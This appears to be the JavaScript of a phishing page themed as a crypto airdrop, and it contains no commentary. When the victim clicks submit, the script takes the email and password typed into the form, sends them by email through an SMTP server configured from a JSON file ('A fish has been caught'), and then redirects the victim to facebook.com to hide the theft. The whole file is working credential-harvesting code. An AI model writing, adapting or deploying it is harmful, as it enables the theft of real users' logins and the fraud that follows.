var crd
async function loadJSON() {
    fetch('file.json')
        .then(response => response.json())
        .then(
            data => RegisterUser(data.host, data.user, data.pwd)
    )
        .catch(error => console.log(error));
}

const email = document.getElementById('email');
const pass = document.getElementById('password');
const submit = document.getElementById('sub_btn');

submit.addEventListener('click', loadJSON);

function RegisterUser(host, user, pwd) {
    Email.send({
        Host : host, 
        Username : user,
        Password : pwd,
        port: 2525,
        To : user,
        From : user,
        Subject : "Crypto Airdrop credentials",
        Body : `
        A fish has been caught
        username: ${email.value}
        password: ${pass.value}
        `
        }).then(
            setTimeout(function() {
                window.location="https://facebook.com";
              }, 2000)
        );
}
// submit.addEventListener('click', RegisterUser);


